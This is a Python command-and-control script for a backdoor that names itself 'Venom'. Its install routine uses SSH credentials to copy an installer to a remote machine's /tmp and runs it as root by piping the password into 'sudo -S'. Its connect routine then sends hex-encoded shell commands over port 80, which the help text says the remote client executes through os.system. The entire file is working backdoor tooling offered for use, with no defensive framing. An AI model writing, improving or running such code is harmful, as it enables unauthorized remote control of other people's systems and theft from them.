#!/usr/bin/env python3
import os
import socket
import file
import paramiko
import subprocess
import time
def main():
    x = True
    while(x):
        option = input("Enter command: ")
        if(len(option) == 0):
            pass
        elif(option.lower() == "install"):
            address = input("Enter address to install client on: ")
            install(address)
        elif(option.lower() == "connect"):
            address = input("Enter address to connect to: ")
            connect(address)
        else:
            printHelp()
def install(address):
    f = open("/etc/venomClient", "r")
    fileCont = f.read()
    fileEncode = fileCont.encode('utf-8').hex()
    user = input("Enter target username: ")
    password = input(f"Enter password for {user}: ")
    
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(address, username=user, password=password)
    
    scp_command = f'scp /etc/venomInstaller {user}@{address}:/tmp/no'
    subprocess.run(scp_command, shell=True, check=True)
    print(f"Listener script copied over to {address}")
            
    print("Running installer. Will be unresponsive for 45 seconds...")
    command = f"bash /tmp/no {fileEncode} &"
    stdin, stdout, stderr = ssh_client.exec_command(f"echo {password} | sudo -S {command}")
    time.sleep(45)
def connect(address):
    sock = socket.create_connection((address, 80))
    print(f"Successfully connected to {address}.")
    x = True
    while(x):
        option = input("Enter command to send to remote server: ")
        if(option.lower() == "cmd"):
            sock.send(encrypt("CMD"))
            y = True
            while(y):
                command = input(f"[Command@{address}#] ")
                if(command.lower() == "exit"):
                    y = False
                if(y):
                    sock.send(encrypt(command))
def encrypt(message):
    firstEncode = message.encode('utf-8')
    return firstEncode.hex().encode('utf-8')
def printHelp():
    print("""
Venom Backdoor Commands:
    
    connect    |     Connects to remote client.
    install    |     Prepares to install Venom client on remote machine.
    
Connected Commands:
    
    cmd        |     Enters menu to send commands directly to remote host's os through python os.system.
    exit       |     Terminates connection.
""")
main()
